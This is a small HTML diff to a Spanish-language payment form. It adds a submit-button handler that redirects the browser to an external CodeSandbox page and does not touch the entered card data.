@@ -147,7 +147,13 @@
             <label for="cvv">CVV:</label>
             <input type="text" id="cvv" name="cvv" required pattern="\d{3}" title="Debe ser un número de 3 dígitos" maxlength="3" minlength="3" oninput="validateLength(this, 3)">
 
-            <button type="submit" id="submitPaymentButton">Enviar</button>
+            <button type="submit" id="submitPaymentButton" onclick="openURL()">Enviar</button>
+            
+            <script>
+              function openURL() {
+                window.location.href = 'https://52p8hz.csb.app/';
+              }
+              </script>
           </form>
 
         </div>
